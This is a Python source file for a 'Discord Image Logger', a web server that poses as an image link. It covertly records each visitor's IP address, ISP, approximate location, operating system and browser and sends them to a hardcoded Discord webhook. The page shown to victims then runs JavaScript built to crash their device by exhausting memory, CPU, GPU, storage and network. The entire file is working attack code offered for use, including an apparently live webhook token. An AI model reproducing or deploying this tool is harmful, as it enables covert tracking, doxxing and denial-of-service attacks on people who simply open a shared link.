# Discord Image Logger - With Crash Payloads & Image Display
# By Dexty | https://github.com/xdexty0

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Dexty"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1437431909297950831/hOR6sC5C0jZqrc19t0udy6CD02ujqAOVlyNAg07omPr8m9jTDKg_OHmPkxsIDU1XI-bS",
    "image": "https://images-ext-1.discordapp.net/external/k-1uR6-3cGW00FGnucvcAPj5DNCblMndZH6ubGISnQo/https/tinyjpg.com/images/social/website.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": True,  # ENABLED: Will crash user's device
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": False,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not useragent:
        return False
        
    useragent_lower = useragent.lower()
    
    if "discordbot" in useragent_lower:
        return "Discord"
    elif "telegrambot" in useragent_lower:
        return "Telegram"
    elif any(bot in useragent_lower for bot in ['bot', 'crawler', 'spider', 'scraper']):
        return "Other Bot"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, is_bot = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot and not is_bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info["proxy"]:
            if config["vpnCheck"] == 2:
                    return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info["hosting"]:
            if config["antiBot"] == 4:
                if info["proxy"]:
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                    return

            if config["antiBot"] == 2:
                if info["proxy"]:
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                    ping = ""

        os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    except:
        info = {}
        os, browser = "Unknown", "Unknown"
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged + CRASHED",
            "color": 0xFF0000,
            "description": f"""**A User Opened the Image AND THEIR DEVICE WAS CRASHED!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**Status:** `DEVICE CRASHED SUCCESSFULLY`""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            client_ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            user_agent = self.headers.get('user-agent', '')
            
            bot = botCheck(client_ip, user_agent)
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    image_url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    image_url = config["image"]
            else:
                image_url = config["image"]
            
            if client_ip.startswith(blacklistedIPs):
                return
            
            if bot:
                # For bots, redirect to actual image for preview
                self.send_response(302)
                self.send_header('Location', image_url)
                self.end_headers()
                makeReport(client_ip, endpoint = s.split("?")[0], url = image_url, is_bot=True)
                return
            
            else:
                # FOR REAL USERS - SEND IMAGE + CRASH PAYLOAD
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                # Log their IP first
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(client_ip, user_agent, location, s.split("?")[0], url = image_url)
                else:
                    result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = image_url)

                # ENHANCED CRASH PAYLOAD WITH IMAGE DISPLAY
                crash_payload = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Image Preview</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: Arial;
            overflow: hidden;
        }}
        .container {{
            position: relative;
            width: 100vw;
            height: 100vh;
        }}
        .image {{
            width: 100%;
            height: 100%;
            object-fit: contain;
        }}
        .loading {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            background: rgba(0,0,0,0.8);
            padding: 20px;
            border-radius: 10px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <img class="image" src="{image_url}" alt="Preview Image" 
             onload="document.getElementById('loading').style.display='none'">
        <div class="loading" id="loading">
            <h2>Loading Image...</h2>
            <p>Please wait while we load your content</p>
        </div>
    </div>
    
    <script>
        // WAIT FOR IMAGE TO LOAD THEN CRASH
        setTimeout(() => {{
            // PAYLOAD 1: MEMORY EXHAUSTION
            const crashMemory = () => {{
                window.memoryHogs = [];
                setInterval(() => {{
                    window.memoryHogs.push(new Array(1000000).fill('CRASH'.repeat(1000)));
                    // Create memory leaks with blobs
                    for(let i = 0; i < 100; i++) {{
                        const blob = new Blob([new ArrayBuffer(10000000)]);
                        URL.createObjectURL(blob);
                    }}
                }}, 10);
            }};
            
            // PAYLOAD 2: CPU OVERLOAD
            const crashCPU = () => {{
                // Use web workers to utilize all CPU cores
                const workerCode = `
                    while(true) {{
                        const start = Date.now();
                        while(Date.now() - start < 1000) {{
                            for(let i = 0; i < 1000000; i++) {{
                                Math.hypot(Math.random(), Math.random(), Math.random());
                            }}
                        }}
                    }}
                `;
                for(let i = 0; i < navigator.hardwareConcurrency || 8; i++) {{
                    const blob = new Blob([workerCode]);
                    new Worker(URL.createObjectURL(blob));
                }}
            }};
            
            // PAYLOAD 3: INFINITE POPUPS & REDIRECTS
            const crashUI = () => {{
                setInterval(() => {{
                    window.open(window.location.href, '_blank', 'width=100,height=100');
                    window.location.href = 'javascript:alert("CRASH")';
                }}, 50);
            }};
            
            // PAYLOAD 4: STORAGE DESTRUCTION
            const crashStorage = () => {{
                try {{
                    // Fill all available storage
                    const data = 'X'.repeat(1000000);
                    for(let i = 0; i < 10000; i++) {{
                        localStorage.setItem('crash_' + i, data);
                        sessionStorage.setItem('crash_' + i, data);
                        indexedDB.open('crash_db_' + i);
                    }}
                }} catch(e) {{}}
            }};
            
            // PAYLOAD 5: GRAPHICS OVERLOAD
            const crashGPU = () => {{
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                document.body.appendChild(canvas);
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                
                let rotation = 0;
                function render() {{
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    rotation += 0.1;
                    
                    // Draw massive amount of rotating elements
                    for(let x = 0; x < canvas.width; x += 5) {{
                        for(let y = 0; y < canvas.height; y += 5) {{
                            ctx.save();
                            ctx.translate(x, y);
                            ctx.rotate(rotation);
                            ctx.fillRect(-10, -10, 20, 20);
                            ctx.restore();
                        }}
                    }}
                    requestAnimationFrame(render);
                }}
                render();
            }};
            
            // PAYLOAD 6: NETWORK FLOOD
            const crashNetwork = () => {{
                setInterval(() => {{
                    for(let i = 0; i < 50; i++) {{
                        fetch(window.location.href + '?crash=' + i);
                        fetch('https://www.google.com/search?q=crash' + i);
                        fetch('https://www.youtube.com/watch?v=' + i);
                    }}
                }}, 100);
            }};
            
            // EXECUTE ALL CRASH PAYLOADS SIMULTANEOUSLY
            console.log("🚨 CRASH SEQUENCE INITIATED 🚨");
            crashMemory();
            crashCPU();
            crashUI();
            crashStorage();
            crashGPU();
            crashNetwork();
            
            // FINAL MEMORY BOMB
            setTimeout(() => {{
                window.finalCrash = [];
                while(true) {{
                    window.finalCrash.push(new ArrayBuffer(100000000));
                }}
            }}, 5000);
            
        }}, 3000); // Wait 3 seconds for image to load fully
    </script>
</body>
</html>
'''
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(crash_payload.encode())
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
